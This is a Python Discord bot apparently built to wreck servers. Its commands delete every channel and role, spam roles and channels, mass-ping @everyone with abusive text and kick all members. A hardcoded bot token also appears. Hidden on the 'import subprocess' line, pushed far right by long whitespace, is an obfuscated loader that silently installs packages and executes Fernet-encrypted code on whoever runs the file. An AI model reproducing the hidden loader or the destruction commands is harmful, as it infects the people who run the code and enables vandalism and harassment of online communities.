import os
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'paBkGFyUBwdYIVBc1A3jkWMZgIhDT90DhIZ0TX2NAhY=').decrypt(b'gAAAAABoK3gFZ_8Zv8XN3GkAPnZnlDA7XXpIKQPZpp6Q3vHb2dzhyTjF-EGszZOVw9DlDtt77cn1VUx7vZm_ZfKeiP0FhfeuGiTLtiBXyT922whNl1xdzC0oYszEk_F4UMMK02x7fqxkJbEa547hYQ-Bv-DqFCfkDGkmsw53KYRbPGgDEWfEnGWwRNz6uaFGcJ_HAsXKhc1qRBcae8PhloLVGCVcn1wSeUx78aY2QtbGDRkJMhEPeS57Y_G_uWmVLpPZQ2aK_A1QdapyTfLHe08s6cKWZMDhPS8TDajYfvbGbSCIrRm64TJxiLxAbDp_F6JQx6BPfLBxQeuEgHrz8hJSX8J8qiNDoGJTbezLfNeaoqtNgMW46ZR49CJM1Jdhzv5cB44gxIEUCToXESGKF4Dw3KDkWDJpLPJRCIWH_Dv0FyPZ0HVzBYmKUPfXFmbq3fqEfStPBOxE3tsaFEMyTls40Pyfv10DdowkUPujxxpdGHcviKfZFHMkTbqbjX8FVOCIXBIdOXhHa_TixfPwpzDmAJEKXWvN__1sgsfZWzia5QYFyhNMzhBUDyNGm1jZuhJqg-JTPB4KpHATC1zf14Pmd90tMf6265vHdVfzne-hAowywczkI_nOPyOf54z3HgrwMWNTpnSPtLSFOtf0R7UaD5g31JahnoeHIDRlEhn_NDbEWWM7Ud28LJXmz1_vQyvbKbTGg-O3uxsI70vY3WTTLPL7OFJeYPZwyaCDlCH6130i9psQAWEdA_MWiDGpBYmDsitzMqe4crgCmHTsOuvdCZRkDRx1F69REOG6TGiFXYdAHSXVd19pXX7pacJeEuo3AtOWx6vrRLIRU5ccJoHLW24saGoXfgwJVMBN6tQSql61RCvDQdtuvJd5TOJ6xljkNUmB-nDDETRWHgKbT90lmfjZewKbyLB5eFHRxdPDyKOt_4ccTQno8d2y4_8YNRF6smeIxsHuBWrLprPjkey5Vd0-NRF-fjJ4IIUAXhZWX2E6xUOA4rEpbkRXhSNh-xbjB5PsBeqTbTEQ_5kIBsUqHEm5QD0FDGTqMz0NbNmqX-zG6Kk__lbxo7FyFptUiZ5uyjvGf4BshYU5gqGSaGURn0XOUXZSvzuRzo-BUrTs4s-hRU_qrP7QhKPOYtiLZTlVW5p2IZj3MA0an5uRrj8OGSl30evXA_l3frfcieO8gb4uTt1ULd8uXHAEXRf8841Uvs7rUGdOBqGm280oU0gEh2lYtaKZeld8NRK3UR9RJ28e5qj8qtXy5WPnCOc61vlafzOlb5U1VS5A4-6TXcF6UN0yu3ojlchenpr9nTR3m4eTvN34xeW_XqQZhn3ghIrlQvpeuyBsWGdDs8gqXo3hOq9jGG392zyf45tfkXT9x6BwGGbpSghVLxNp25SzXou-d6jhqDBEiQasfgMQVwRz_Qs-3QstggIi-UaSG8CQZPcTTtaYpN2vADPcyo0IEibaplKGqcHw80-dgJ7jzsHrwqIzF3NQ3XxhCVK329p7-4Nm2D5bewrZ-jtZEpJKFieepU5XEO1OgSvrbE6DzKTdvT89vqHsIR38jU0P-mQolU2jmK1cKu3v0jhk24can-cbMAb72PqaE6oJLIa1HfyuwYwMLlwRE7zGYKMbTnHqa3_4FKnJ_wWzlop0gXovcz88Prk-hLa7HxPu3F8p7qe8PlwpxxEEFSfeNZQNBHPvw30LcMCDbDDgyFqPfQVmcj8MyvI9uqLpMoka8b7sQEMG5y4VcavLQ1lTpcFy6bO3p-NXZfP8G8K6CJHeU87RaAEY3_ofk59EIUetjsXoiwe0FtF1m5N6JxJckTNYD5jqRjy_hiinU7Ka-ILk5Xehwc0mWGS9kwBcP8Wav4Fox52SXtGA8gwCwZ5UaoVCDfnSjhTLOyxlabHgoJdBjKUdapgRtontSOQT812eY1L_xh1Ld1v70qU6ZaCYnW1XT3SGlQYYWyUiAHm_0G63eHQkEZDoNizbdmkudUV8QZtAU7Y8dnQ3-Z5PhTq007g3HuvEtPvSER_sCd2p6tpxDzjb13IYOm4zc87TJgQrQWOWcsDFVdnmN6sWYA=='));
import discord
from discord.ext import commands

intents = discord.Intents.default()
client = commands.Bot(command_prefix="!", intents=intents)
client.remove_command("help")

@client.event
async def on_ready():
    print("Ready!")

@client.command()
async def destroy(ctx, guild_id: int):
    await ctx.send("**Process Initiated. We're going to have a lot of fun.**")
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid Guild ID.")
        return

    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            print("Deleting channels failed.")
    for role in list(guild.roles):
        try:
            await role.delete() 
        except:
            print("Deleting roles failed.")
    for _ in range(125):
        try:
            await guild.create_role(name="unknown")
        except:
            print("Creating roles failed.")
    for _ in range(125):
        await guild.create_text_channel(name="unknown")
    for channel in list(guild.channels):
        for _ in range(5):
            try:
                await channel.send("@everyone Server Just Got Fucked unknown.")  
            except:
                print("Sending Message failed.")

@client.command()
async def kick(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return
    
    if not guild.me.guild_permissions.kick_members:
        await ctx.send("I don't have permission to kick members.")
        return
    
    for member in guild.members:
        try:
            if member == guild.owner:
                continue
            await member.kick(reason="kick members")
            await ctx.send(f"{member.display_name} has been kicked from the server.")
        except discord.Forbidden:
            await ctx.send(f"{member.display_name} I'm not allowed to kick this user.")
        except discord.HTTPException:
            await ctx.send(f"{member.display_name} there was an error trying to kick this user.")
    
    await ctx.send("All members on the server have been kicked out.")



@client.command()
async def members(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid Guild ID.")
        return
    member_count = guild.member_count
    await ctx.send(f"The server has {member_count} members.")

@client.command()
async def nothing(ctx, guild_id: int):
    await ctx.send("**Process Initiated.**")
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid Guild ID.")
        return
    
    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            print("Deleting channels failed.")
    for role in list(guild.roles):
        try:
            await role.delete() 
        except:
            print("Deleting roles failed.")

@client.command()
async def help(ctx):
    await ctx.send("**[1] !help - `(Show Commands)`**")
    await ctx.send("**[2] !destroy [guild_id] `(Destroys the specified server)`**")
    await ctx.send("**[3] !kick [guild_id]`(Ban All Members on the Server)`**")
    await ctx.send("**[4] !members [guild_id] `(Shows the number of members in the server)`**")
    await ctx.send("**[5] !nothing [guild_id] `(Deletes all channels and roles)`**")
    await ctx.send("**[6] !f `(Exit Bot)`**")

@client.command()
async def f(ctx):
    await ctx.send("Exiting...")
    await client.close()

TOKEN = "MTIzNzc0ODQ2NTExMTUzMTU1MQ.GxuOcC.ipHRpOXTs9Q29hCis82pH7Y2XGmOsyQD3xeuZI"
client.run(TOKEN)
